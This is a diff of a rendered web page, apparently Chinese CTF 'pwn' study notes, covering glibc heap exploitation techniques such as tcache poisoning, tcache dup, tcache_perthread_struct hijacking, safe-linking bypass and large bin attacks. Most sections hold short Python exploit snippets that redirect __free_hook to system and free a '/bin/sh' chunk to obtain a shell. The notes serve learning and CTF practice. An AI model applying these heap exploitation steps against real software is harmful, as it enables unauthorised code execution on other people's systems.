+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">p *<span class="o">(</span>struct tcache_perthread_struct*<span class="o">)</span> 0xaaaa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="tcache-poisoning">Tcache Poisoning</h4>
+<ul>
+<li>覆盖tcache的next指针，无需伪造chunk结构，可实现malloc到任何地址</li>
+<li>safe-linking机制之前可使用</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 进入tcache</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span> <span class="c1"># 改next指针为__free_hook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># 申请第一个chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># 申请__free_hook指向地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># getshell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="tcache-dup">Tcache Dup</h4>
+<ul>
+<li>适用于glibc-2.27，两次释放同一块chunk，再malloc，等效于uaf，show可以泄露地址，修改next指针可进行 tcache poisoning</li>
+</ul>
+<p><strong>泄露堆地址</strong></p>
+<p>double free后tcache中的唯一堆块指向自己，只要不修改fd指针，可以多次malloc均为该chunk</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># chunk0</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 泄露堆地址，通过偏移可获取tcache结构体基地址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="/img/pwn_note.zh-cn.assets/image-20241127233211910.png" alt="image-20241127233211910" style="zoom: 67%;" />
+<p><strong>控制fd指针</strong></p>
+<blockquote>
+<p><strong>__free_hook劫持</strong></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># chunk0</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># chunk0</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 劫持__free_hook chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># getshell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>tcache_perthread_struct劫持</strong></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x240</span><span class="p">)</span> <span class="c1"># chunk0</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span> <span class="c1"># fd字段</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x240</span><span class="p">)</span> <span class="c1"># chunk0</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x240</span><span class="p">)</span> <span class="c1"># 劫持tcache结构体</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span> <span class="c1"># 覆盖count 以及 tcache_entry, deadbeef改为target地址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>再申请一个chunk，为chunk0，将fd覆盖为<code>tcache_perthread_struct</code>地址，接着两次malloc后，第二次malloc分配的堆块到<code>tcache_perthread_struct</code>结构体地址，可以控制该结构体</p>
+</li>
+<li>
+<p>编辑tcache结构体中的count为极大值，导致之后分配的chunk在free后因tcache判定满而不进入tcache达成绕过</p>
+</li>
+<li>
+<p>也可<strong>将其所在的0x251大小的chunk 释放到unsorted bin</strong>，再次申请0x240大小的chunk修改tcache结构体</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>__malloc_hook劫持</strong></p>
+</blockquote>
+<ul>
+<li>可以接着<strong>通过修改结构体中的<code>tcache_entry</code></strong>，其每隔8字节是一个指向tcache bin的地址，覆盖其中一个地址为【malloc_hook-0x13】地址来劫持malloc</li>
+<li>若要向malloc_hook地址申请0x20的chunk，需要劫持tcache_entry中属于0x30（0x20+0x10）的位置</li>
+</ul>
+<h4 id="tcache-extend">Tcache Extend</h4>
+<ul>
+<li>存在UAF及堆溢出8字节，修改下一个chunk的size字段，堆块堆叠</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">))</span> <span class="c1"># chunk1 size=0x100</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># tcache bin -&gt; chunk1(包含chunk2)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 将chunk1申请出来，chunk1与chunk2堆叠</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># 释放chunk2：tcache bin -&gt; chunk2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">))</span> <span class="c1"># 修改chunk1，实际覆盖chunk2的fd指针劫持</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="tcache-key-bypass">Tcache key Bypass</h4>
+<p>① 利用 UAF 将 free chunk 中记录的 tcache key清除，使其不等于tcache结构体地址来绕过该检测，可以double free</p>
+<p>当tcache count为0时，即使其指向target也无法申请出来，尝试申请chunk将count变大</p>
+<p>② <strong>house of kauri</strong></p>
+<p>③ tcache stash with fastbin double free</p>
+<ul>
+<li>fastbin 中没有严密 double free 检测，填满tcache后在fastbin完成double free</li>
+<li>通过stash机制将fastbin中chunk倒回tcache中</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span> <span class="n">new</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">9</span><span class="p">):</span> <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># 填满tcache</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fastbin double free</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">9</span><span class="p">):</span> <span class="n">new</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span> <span class="c1"># 耗尽tcache</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span> <span class="c1"># 触发stash</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span> <span class="c1"># 然后malloc 3次申请出target</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="/img/pwn_note.zh-cn.assets/image-20241128153011470.png" alt="image-20241128153011470" style="zoom: 67%;" />
+<p>④ <strong>House of Botcake</strong></p>
+<h4 id="fastbin-reverse">Fastbin Reverse</h4>
+<ul>
+<li>calloc申请内存不会从tcache中获取，直接从堆块获取，取完后会通过stash机制将fastbin中chunk放入tcache中</li>
+<li>修改fastbin中chunk的fd指针，会在fd+0x10(target)地址处写入极大值</li>
+</ul>
+<p><strong>calloc情况</strong></p>
+<img src="/img/pwn_note.zh-cn.assets/image-20241128201222311.png" alt="image-20241128201222311" style="zoom: 80%;" />
+<p><strong>malloc情况</strong></p>
+<ul>
+<li>由于malloc从tcache bin中取，需要先消耗完tcache中的chunk再触发stash</li>
+<li>为防止target的fd指向无效数据使stash失败，需要在fastbin中预留6个chunk填充tcache</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span> <span class="n">new</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 7个填充chunk，1个利用chunk，6个预留chunk</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span> <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># 7 tcache bin，7 fast bin</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># tcache 空缺一个</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># 同时进入fastbin 和 tcache中</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 从 tcache 中取</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span> <span class="c1"># 修改fd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">):</span> <span class="n">new</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 取出所有tcache bin中chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 触发stash，fastbin中chunk进入tcache bin中，【tcache: __free_hook-&gt;6 chunk】</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 劫持__free_hook地址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="tcache-stash-unlink">Tcache Stash Unlink</h4>
+<h4 id="safe-linking-bypass">Safe-linking Bypass</h4>
 <p>glibc-2.33引入的新检查机制</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -9215,9 +9835,9 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cm">/* 加密函数 */</span>
-</span></span><span class="line"><span class="cl"><span class="cp">#define PROTECT_PTR(pos, ptr) \
-</span></span></span><span class="line"><span class="cl"><span class="cp">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/* 解密0函数 */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define PROTECT_PTR(pos, ptr)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="p">((</span><span class="n">__typeof</span> <span class="p">(</span><span class="n">ptr</span><span class="p">))</span> <span class="p">((((</span><span class="n">size_t</span><span class="p">)</span> <span class="n">pos</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">size_t</span><span class="p">)</span> <span class="n">ptr</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* 解密函数 */</span>
 </span></span><span class="line"><span class="cl"><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
 </span></span></span></code></pre></td></tr></table>
 </div>
@@ -9238,7 +9858,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 第二块被释放: fd = (0x123456789adc &gt;&gt; 12) ^ 0x123456789abc = 0x1235753dfd35
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>绕过方法：通过UAF填写<code>fd</code>的值为0（初值），之后泄露出该<code>tcache bin</code>堆块的<code>fd</code>的值实则为该堆块地址的前9位，进行偏移计算可获得该堆块地址即堆地址</p>
+</div><p><strong>绕过</strong></p>
+<ul>
+<li>通过UAF填写<code>fd</code>的值为0（初值），之后泄露出该<code>tcache bin</code>堆块的<code>fd</code>的值实则为该堆块地址的前9位，偏移计算获得堆地址</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -9249,73 +9872,14 @@
 </span></span><span class="line"><span class="cl"><span class="nb">next</span> <span class="o">=</span> <span class="p">((</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">))</span> <span class="o">^</span> <span class="n">free_hook_addr</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>覆盖<code>fd</code>为<code>free_hook</code>地址异或后的<code>next</code>地址劫持，申请2个同样大小堆块，从tcache中选出一块，第二块为fd指向的<code>free_hook</code>地址，写入<code>system</code>地址后，调用<code>free()</code>包含<code>'/bin/sh'</code>的堆块达到getshell目的</p>
-<h4 id="double-free-1">Double free</h4>
-<p>适用于2.27最初版本，两次释放同一块chunk</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/img/pwn_note.zh-cn.assets/-172844676894976.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<p>泄露堆地址：UAF导致chunk中的fd指向自己，通过show功能可以泄露出heap的地址，通过调试的偏移可以获取到<strong>tcache结构体的基址</strong></p>
-<p><strong>控制<code>tcache_perthread_struct</code>：</strong></p>
-<ul>
-<li>再申请一个chunk，即为原来的chunk1，将fd覆盖为**<code>tcache_perthread_struct</code>**的地址，此时两次malloc后的第二次malloc分配的堆块到<code>tcache_perthread_struct</code>结构体地址，可以控制该结构体</li>
-</ul>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844676894977.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<ul>
-<li>编辑tcache结构体中的count为极大值，导致之后分配的chunk在free后不会进入tcache进行绕过（因为tcache判别时发现已满），此时我们可以<strong>将tcache结构体【0x251大于fastbin的0x80】所在的chunk free到unsorted bin</strong>中，进行后续利用（泄露地址或unsorted bin attack）</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">#1</span>
-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">-</span> <span class="mh">0x250</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">#2</span>
-</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">#3</span>
-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x28</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
 </div><ul>
-<li>当申请堆块可覆盖tcache结构体时，且如上已经覆盖导致tcache认为自己已满，此时可以接着<strong>通过覆盖修改结构体中的<code>tcache_entry</code></strong>，其中每隔8字节是一个指向tcache bin的地址，如前tcache图中所示，覆盖其中一个地址为跳向【malloc_hook-0x13】的地址，可以达到劫持malloc目的，后续操作参考tcache bin attack，其中注意：若之后要向malloc_hook地址申请0x20的chunk，需要劫持tcache_entry中属于0x30（0x20+0x10）的位置</li>
+<li>覆盖<code>fd</code>为与<code>__free_hook</code>地址异或后的<code>next</code>地址，申请2个同样大小堆块，第二块为fd指向的<code>__free_hook</code>地址</li>
+<li>写入<code>system</code>地址，调用<code>free()</code>包含<code>'/bin/sh'</code>的堆块达成getshell</li>
 </ul>
 <h3 id="large-bin-attack">Large bin attack</h3>
+<h4 id="地址泄露-1">地址泄露</h4>
 <ul>
-<li>保护全开，glibc-2.31，通过UAF来利用</li>
+<li>保护全开，glibc-2.31，通过UAF利用</li>
 <li><strong>0x4FF &lt; size &lt; 0xFFF</strong>：申请对应large bin，<code>malloc</code> 时，会遍历 <code>unsorted bin</code>，若无法<strong>精确分配</strong>或不满足切割分配条件，会将该 <code>chunk </code>置入相应大小的 <code>bin</code>(<strong>large bins</strong>) 中</li>
 </ul>
 <p><strong>泄露libc基址</strong></p>
@@ -9330,12 +9894,12 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x700</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1"># 隔开 top chunk</span>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x700</span><span class="p">)</span> <span class="c1"># 隔开 top chunk</span>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 1 进入 unsorted bin</span>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># 3 并入 top chunk</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x700</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="c1"># free chunk 1 无法满足 进入 large bins</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x700</span><span class="p">)</span> <span class="c1"># free chunk 1 无法满足 进入 large bins</span>
 </span></span><span class="line"><span class="cl"><span class="n">browse</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 同样可获取一个到main_arena偏移一段距离的地址, 泄露libc基址</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -9360,7 +9924,202 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># fd=bk, fd_nextsize=bk_nextsize</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="mp_-struct-attack">mp_ struct attack</h4>
+</div><p>注：泄露地址fd结尾出现00截断时，编辑该堆块填入&rsquo;a&rsquo;覆盖00</p>
+<h4 id="目标地址写大数">目标地址写大数</h4>
+<p><strong>原理</strong></p>
+<ul>
+<li>glibc-2.30前，chunk链入 <code>large bin</code> 过程缺乏对 <code>bk</code> 和 <code>bk_nextsize</code> 指针检查，利用修改可进行<strong>两处任意地址写</strong></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
